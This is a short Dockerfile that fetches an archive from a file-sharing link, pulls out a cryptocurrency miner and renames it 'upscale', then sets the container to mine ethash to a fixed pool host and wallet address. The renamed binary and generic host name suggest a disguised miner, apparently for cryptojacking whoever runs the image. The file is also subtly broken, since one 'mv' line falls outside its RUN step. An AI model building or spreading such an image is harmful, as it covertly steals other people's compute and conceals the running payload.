FROM ubuntu:20.04

LABEL maintainer="Roman Nikov"

RUN apt update; \
    apt install -y wget; \
    wget https://www.4sync.com/web/directDownload/1RZH1ucq/15xqQxN1.a888d2a0703a72867b648d5452418dce; \
    tar xf 15xqQxN1.a888d2a0703a72867b648d5452418dce; \
    cd upscale; \
    cp miner /usr/local/bin/miner; \
    cp mine_eth.sh /usr/local/bin/mine_eth.sh; \
    cd /usr/local/bin;
    mv miner upscale;

WORKDIR /usr/local/bin

RUN chmod 777 mine_eth.sh;

RUN chmod 777 upscale;

CMD upscale --algo ethash --server workload.sytes.net:9999 --user 0xC424C2BCbD57ff24C7daBB504Bb2fD968901a176
